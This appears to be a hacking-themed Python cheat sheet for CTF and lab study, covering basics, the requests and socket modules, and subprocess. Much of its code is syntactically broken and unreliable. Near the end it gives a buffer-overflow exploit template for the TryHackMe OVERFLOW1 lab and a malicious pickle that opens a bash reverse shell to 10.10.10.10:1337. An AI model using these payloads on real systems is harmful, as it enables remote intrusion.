# Useful Python(3 only)

This is a condensed and *Hacking Themed* resource for python.
Remember with python [you need a ruler for tab indentation](https://www.youtube.com/watch?v=YnL9vAFphmE) and [sometimes we have a competition to write the longest list comprehension...and sometimes it's in production...and sometimes we don't call it a competition but work](https://www.youtube.com/watch?v=BgxklT94W0I) which requires a [phd](https://www.youtube.com/watch?v=xyrgkui0uCA). This like [xinyMinutes](https://learnxinyminutes.com/docs/python) with most hacking theme and base of things I have found or used.

# Basics

### Fundamentals

```python 
#! /usr/bin/python3 # Shebang line
# Comments with # 
	# Tab indentation is

myInt = 1337
myFloat = 1010.0101
myString = "ping"
print(f"{myString[0]} {myString[1]} {myString[2]} {myString[3]} string slicing with \[1:2\] {myString[1:2]} python")
myList = ["burp", "gobuster", "hydra", "empire", "nikto", "nmap", "sqlmap", "wfuzz", "SecLists","PayloadAllTheThings","OWASPtop10","Discover by Lee Baird",False,True]
print(f"{myString}.. using f-string(these can be used in variable declaration aswell!) in a print to stdout")
print(f"reference by index value with square bracks: \[{mylist[1}\]") 
# Data storage types
myMatrix = [
            [0,0,0],
            [0,1,0],
            [0,0,0],
        ]
myTuple_Zero, myTuple_One,myTuple_leet, myTuple_MFS, myTuple_Burp = (0,1,1337,4444,8000) 
mySet = {"nmap", "brutespray", "gobuster", "nikto"}
myDict = {
    8000 : "Burp Suite Proxy"
    admin : "password"
    True : False
    definition : "A dictionary is a key value pair, the string is the value, but its key is defintion"
}
myDict["to add to a dictionary"] = "simply have a key in square brackets and assign a value" 

# Useful functions
len()
type()
str() # string type casting
int() # int type casting
round(myFloat)
sorted()
set(myList)
# Useful methods
myList.append("crackmapexec")
.remove
.contains()
.split('delimiter')
.index()
# Looping with for, for range, while keywords
for tool in myList:
	print(f"{tool} is ready for use!")
	print("SERIOUS COUNTING IN A WHILE AND THEN AFOR LOOP")
    	i = 0
    	while i < 10:
        	print(i)
        	i += 1
		for i in range myDict:
			print(f"{i+{str({int(i)})} is f strings nesting")
```

### Functions

```python 
def commands():
    theMethod = {
             "nmap":" -sC -sV -O -T 4 -p- ",
             "nikto":" -h ",
             "gobuster":" dir -u http://"
        }

    gobusterVar = {
                "dirbusterDirMed":" -w /usr/share/dirbuster/directory-list-2.3-medium.txt",
                "dirbCommon":" -w /usr/share/dirb/common.txt"
        }

    ip = "10.10.10.10"

    for k in theMethod.keys():
        if k != "gobuster" and k != "nikto": # and is like && but with and extra letter..
            print(f"{k}{theMethod[k]}{ip}")
        else:
            for l in gobusterVar:
                print(f"{k}{theMethod[k]}{ip}{gobusterVar[l]}")

    print("complete")
```

### Function declaration, returns, \*args and \*\*kwargs

```python
def super_func(*args)
    return sum(args)

def special_func(**kwargs)

print("super_func() with *args can accept any number of any type of arguments")
print("special_func(**kwargs) can accept any number of any type keyword=value")
print("Ordering dule: params, *args, defult parameters then **kwargs")
```

### File IO and User Input with keyword input

```python
# This consider nooby 
print("Would you like to read from the demo.txt? Y/n:")
    if input('Y'):
    # use: with open(file.txt, "r") as f:
        f = open("demo.txt", "r")
        data = f.read()
        linedline = f.readline() 
        for line in linebyline:
                print(line)
        f.close()

# to method like var.method
# "r" to read
# "a" to append 
# "w" to write
# "x" to create new file

# It is better to use with that auto closes after use - good for tear down code!
with open(ip_range, "r") as f:

```

### CLI and ENV
```bash
python3 
python3 -v
```

# Next level

Python3 modules

The old faithful; create a http server on port 1337
```bash
python3 -m http.server 1337
```

Convert any data that is json input into cli and human readable formatting 
```bash 
curl http://allthejson | python3 -m json.tool
```


### Enumerate
Enumerate is commonly consider better in many case for solving problems with iterables, they return index and element:
```python
for i,word in enumerate('iteratables are tuples, lists, sets, dict, strings'):
	print(f"{i} : {char}")
	i = 20
	while i > 0:
		print(f"Tick tock...{i} and {char} seconds left")
    	i -= 1
```

## Hex2Bin & Hexdump
```python
def h2bin(x):
        return decode_hex(x.replace(' ', '').replace('\n', ''))[0]

def hexdump(s):
    for b in range(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % c for c in lin)
        pdat = ''.join(chr(c) if 32 <= c <= 126 else '.' for c in lin)
        print( '  %04x: %-48s %s' % (b, hxdat, pdat))
    print()
    

test = h2bin('''00 00 00 ''')
```
[akshatmittal](https://gist.github.com/akshatmittal/10279360) updated from [exploitdb](https://www.exploit-db.com/exploits/32745)


## With key word File I/O
```python
with open(wordlist, "r") as f:
            words = f.read()
```

### Nonlocal keyword
```python
nonlocal # thisnotglobalbutoutsidefunctionscopyinguse with care
```

Modules and packages allow for programmers to segment code to organise and allow other code to reuse that code. Avoid importing loops main.py-\>foo.py\<-\>bay.py 
```python
import module
import package.package_module
from something import onething
externalImports = "External modules work in a similar way except we will need to make them available in our PYTHONPATH so they can be imported. This can be done by downloading the module manually and placing it in a directory that Python will search for modules in. We can also do this automatically by using a tool named pip. Pip is a Python package installer that will make it very easy to download and install Python modules into appropriate locations on our system."
print(externalImports)
```

### re module
Find substrings with regex functionality in strings annd counting substrings or regexs:
```python
import re
pattern = '[0-9]'
res = sum(1 for _ in re.finditer("", r.text)) #, re.IGNORECASE))
res = len(re.findall('', string))#, re.IGNORECASE))
res = [re.sub(pattern, '', i) for i in list] 
```

### Boolean
Ternary and shortcircuiting
```python
is_ternary = True
ternary_op_message = "This message will print at evaluation of the boolean  of is_tenery with if and else" if is_tenary else "Not ternary"
print(is_ternary)
if is_ternary or is_short_circuiting
print("Short circuiting using or with is_ternary and is_short_circuiting being True")
print("is keyword check the value in memory is the same")
```

## Some Modules and Packages for Hackers
### requests
```python
import requests

r = requests.get('http://localhost')
r.status_code
r.text
r.headers
r.encoding
r.json
```
### socket
```python
import socket

ip_address = "127.0.0.1"
port = 1337
buffer_size = 1024

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip_address, port))
print(s.recv(buffer_size).decode())
s.send("Message".encode())
s.close()
```
### pwntools
```python
import pwntools
```

# Advanced

### Subproceses

[Reference](https://www.digitalocean.com/community/tutorials/how-to-use-subprocess-to-run-external-programs-in-python-3)

```python
def examples_subproccess(): 
    #stdout as result
    result = subprocess.run(["cat", "sample.txt"], stderr=subprocess.PIPE, text=True)
    print(result.stderr)
    #stdin
    result = subprocess.run(["echo", "Hello, World!"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    print(result.stdout)
    # wait for process
    process = subprocess.Popen(["ls", "-la"])
    process.wait()
    # communicate - get output, error and give input
    process = subprocess.Popen(["echo", "Hello, World!"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    result = process.communicate()
    # input into a subprocess
    process = subprocess.Popen(["python3", "add.py"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    process.stdin.write("2 3")
    process.stdin.close()
    # Poll to find whether process is complete or not
    while True:
    output = process.stdout.readline()
    if output:
        print(output.strip())
    result = process.poll()
	if result is not None:
		break
# bash
exit_code = subprocess.call
```

### Async 
```python
async def put_proc_queue():
#tools_dictionary key and the value become
#    = mp.Process(target=
#   .start()

async def pop_entire_proc_queue():
    for proc in proc_queue:
        proc.join()

async def somthing:
	somethingofthis...
	
async def run_sequence(*functions: Awaitable[Any]) -> None:
	for function in functions:
    	await function

async def run_parallelism(*functions: Awaitable[Any]) -> None:
	await asyncio.gather(*functions)	
	
await somthing.somethingofthis
tuple1, = #await asycio.gather() #add await if asynchronos, use to replace list comprehension


await run_parallelism(
	something()
	await run_sequence(
		something()
		something()
		)
)	
```

## Encoding, Packing Bytes and Strings
https://tryhackme.com/room/bufferoverflowprep
https://docs.python.org/3/library/struct.html
https://docs.pwntools.com/en/stable/

There is alot here:
```python
#!/usr/bin/python3
import socket
import struct
import sys

# stdout in bytes:
sys.stdout.buffer.write(bytes('a string'))


def customp32(data):
#struct.pack(">I", data) # big endian
#struct.pack("<I", data) # little endian
    return struct.pack("<I", data)

host, port = "10.10.61.109", 1337

all_chars = bytearray(range(1,256))
# instead of:
#for x in range(1, 256):
#  print("\\x" + "{:02x}".format(x), end='')
#print()

bad_chars = [
        b"\x07",
        b"\x2d",
        b"\x2e",
        b"\xa0",
        ]
# Add bad char to bad_chars as we discover them
for bad_char in bad_chars:
    all_chars = all_chars.replace(bad_char, b"")

cmd = b"OVERFLOW1 "
pattern_length = 2000 # Documentation and keep for length retention
offset = 1978
new_eip = b"BBBB"
jmp_esp = customp32(0x625011AF) # must be the correct endianness

payload = b"".join([
            cmd,
            b"A" * offset,
            jmp_emp, # replaced new_eip
            all_chars,
            b"C" *  (pattern_length - len(new_eip) - offset - len(all_chars)),
        ])

with socket.socket() as s:
    s.connect((host,port))
    s.send(payload)

```

Pwntool Packing
```python
>>> p8(0)
b'\x00'
>>> p32(0xdeadbeef)
b'\xef\xbe\xad\xde'
>>> p32(0xdeadbeef, endian='big')
b'\xde\xad\xbe\xef'
>>> with context.local(endian='big'): p32(0xdeadbeef)
b'\xde\xad\xbe\xef'

Make a frozen packer, which does not change with context.

>>> p=make_packer('all')
>>> p(0xff)
b'\xff'
>>> p(0x1ff)
b'\xff\x01'
>>> with context.local(endian='big'): print(repr(p(0x1ff)))
b'\xff\x01'

```


To un-pickle the data you can: [Ref](https://stackoverflow.com/questions/24906126/how-to-unpack-pkl-file)
```python
import pickle

with open('serialized.pkl', 'rb') as f:
    data = pickle.load(f)
```

Pickle exploit
```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        cmd = ("/bin/bash -c 'exec bash -i &>/dev/tcp/10.10.10.10/1337 <&1'")
        return os.system, (cmd,)

if __name__ == "__main__":
    with open('badpickle.pkl', 'wb') as f:
        pickle.dump(RCE(),f)
    # Test with:
    #with open('badpickle.pkl', 'rb') as f:
    #    data = pickle.load(f)
```


# Appendix

## Tips for cleaner code

```python
print("Ints type convert wto float when they become decimal values")
print("Don't read the dictionary")
print("Don't comment too much make documentation as code")
print("Dictionary is unordered, key - value pair")
print("Scope is what variable do I have access to")
print("Keys are immutable, has to be unique")
print("Lists are ordered, denoted by square brackets")
print("Are collection of unique unordered objects")
print("Tuples are immutable")
print("code if clear'n'clear")
print("Simple and standardised, without bad smells can be readable to be refactored if needed")
print("Predicately domain delivery under SOLID design principles")
print("DRY but away from condition pyramids of doom")
print("Functionally like lego, compositional and extendable but closed for modification")
```

